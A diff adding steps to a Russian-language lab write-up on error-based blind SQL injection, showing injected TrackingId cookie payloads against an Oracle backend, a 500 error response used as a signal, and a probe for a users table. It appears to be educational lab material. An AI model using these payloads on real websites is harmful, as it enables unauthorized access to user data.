@@ -26,3 +26,31 @@ Cookie: TrackingId=nuY97mfc9YodwK25'|| (SELECT '' FROM DUAL) || '
 
 Мы определили БД.
 
+Для того, чтобы быть уверенным, что перед нами Blind-SQL-Injection попытаемся получить данные из несуществующей таблицы (посмотрим на поведение веб-сайта):
+
+sql```
+Cookie: TrackingId=zAzb3amQWMFUTIlS' || (SELECT '' FROM DUALFIEWJFOW) ||'
+```
+
+Видим ошибку:
+
+sql```
+HTTP/2 500 Internal Server Error
+Content-Type: text/html; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 2330
+```
+Следующим шагом, нам необходимо убедиться, что список пользователей существует в БД:
+
+sql```
+Cookie: TrackingId=zAzb3amQWMFUTIlS' || (SELECT '' FROM users WHERE ROWNUM = 1) ||'
+```
+
+Для чего я добавил `WHERE ROWNUM = 1`? Все потому что, если оставить
+
+sql```
+Cookie: TrackingId=zAzb3amQWMFUTIlS' || (SELECT '' FROM users) ||'
+```
+
+Мы получим ошибку, так как нет уточнения, что я хочу получить одну строку юзера (по отдельности), то есть по умолчянию пытаемся взять все данные из таблицы, ччто приводит к ошибке: 
+`single-row subquery returns more than one row`
